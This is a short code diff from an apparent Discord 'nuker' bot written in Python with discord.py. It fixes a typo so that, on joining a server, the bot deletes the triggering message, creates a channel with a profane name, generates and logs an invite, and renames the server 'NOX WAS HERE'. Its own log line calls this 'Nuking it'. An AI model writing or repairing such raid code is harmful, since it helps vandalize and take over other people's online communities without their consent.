@@ -15,7 +15,7 @@ class Startup(commands.Cog):
             await ctx.message.delete()
             try:
                 print(f'Joined guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
-                await ctx.uild.create_text_channel(f'fuckme1')
+                await ctx.guild.create_text_channel(f'fuckme1')
                 invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
                 await ctx.guild.edit(name="NOX WAS HERE")
